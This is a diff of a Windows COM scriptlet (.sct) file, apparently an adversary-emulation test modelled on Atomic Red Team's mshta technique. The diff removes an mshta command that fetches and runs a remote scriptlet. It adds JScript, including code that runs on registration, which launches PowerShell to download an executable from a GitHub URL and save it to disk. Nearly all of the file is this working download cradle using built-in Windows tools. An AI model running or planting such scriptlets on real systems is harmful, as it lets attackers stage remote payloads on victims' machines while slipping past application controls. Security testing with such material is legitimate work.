@@ -1,29 +1,27 @@
 <?XML version="1.0"?>
 <scriptlet>
-  <!-- Test -->
-  <!-- mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct")).Exec();close(); -->
-
 <registration
-    description="Bandit"
-    progid="Bandit"
+    description="Tester"
+    progid="Tester"
     version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-	>
-
+    classid="{AAAA0000-0000-0000-0000-0000AAAAAAAA}">
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"Invoke-WebRequest -Uri 'https://github.com/arsaljabbar/windows/raw/refs/heads/main/calc.exe' -OutFile 'C:\\users\\calc.exe'; write-host -ForegroundColor Cyan $(Get-Date -Format s) 'File downloaded successfully!'\"");
+        ]]>
+    </script>
 </registration>
 
 <public>
     <method name="Exec"></method>
 </public>
+
 <script language="JScript">
-<![CDATA[
-
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-	}
-
-]]>
+    <![CDATA[
+        function Exec() {
+            var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"Invoke-WebRequest -Uri 'https://github.com/arsaljabbar/windows/raw/refs/heads/main/calc.exe' -OutFile 'C:\\users\\calc.exe'; write-host -ForegroundColor Cyan $(Get-Date -Format s) 'File downloaded successfully!'\"");
+        }
+    ]]>
 </script>
 
 </scriptlet>
